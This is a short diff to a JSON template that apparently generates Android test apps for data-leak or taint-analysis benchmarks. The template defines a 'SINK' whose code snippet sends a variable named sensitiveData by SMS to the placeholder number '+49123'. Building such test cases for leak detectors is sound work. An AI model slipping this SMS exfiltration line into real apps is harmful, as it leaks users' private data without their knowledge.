@@ -1,5 +1,6 @@
 {
     "type": "SINK",
+    "pattern": "IN",
     "imports": [
         "import android.telephony.SmsManager;"
     ],
@@ -8,7 +9,7 @@
     ],
     "module": [
         "SmsManager §sm$ = SmsManager.getDefault();",
-        "§sm$.sendTextMessage(\"+49123\", null, sensitiveData, null, null);",
+        "§sm$.sendTextMessage(\"+49123\", null, sensitiveData_€, null, null);",
         "{{ module }}"
     ],
     "methods": [
